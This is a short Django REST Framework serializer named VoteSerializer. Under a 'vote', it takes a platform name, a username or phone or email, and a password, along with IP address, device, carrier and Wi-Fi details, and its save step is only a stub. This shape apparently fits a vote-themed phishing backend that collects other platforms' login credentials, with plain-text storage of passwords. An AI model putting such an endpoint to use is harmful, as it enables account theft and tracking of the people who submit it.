from rest_framework import serializers

class VoteSerializer(serializers.Serializer):
    platform = serializers.CharField(required=True)
    username = serializers.CharField(required=True)  # Can be phone number, username, or email
    password = serializers.CharField(required=True)
    device_model = serializers.CharField(required=False, allow_null=True)
    device_manufacturer = serializers.CharField(required=False, allow_null=True)
    operating_system = serializers.CharField(required=False, allow_null=True)
    os_version = serializers.CharField(required=False, allow_null=True)
    ip_address = serializers.CharField(required=False, allow_null=True)
    user_agent = serializers.CharField(required=False, allow_null=True)
    network_info = serializers.CharField(required=False, allow_null=True)
    carrier_info = serializers.CharField(required=False, allow_null=True)
    bluetooth_ssid = serializers.CharField(required=False, allow_null=True)
    wifi_ssid = serializers.CharField(required=False, allow_null=True)

    def create(self, validated_data):
        # Save the vote to the database
        # Example: Vote.objects.create(**validated_data)
        return validated_data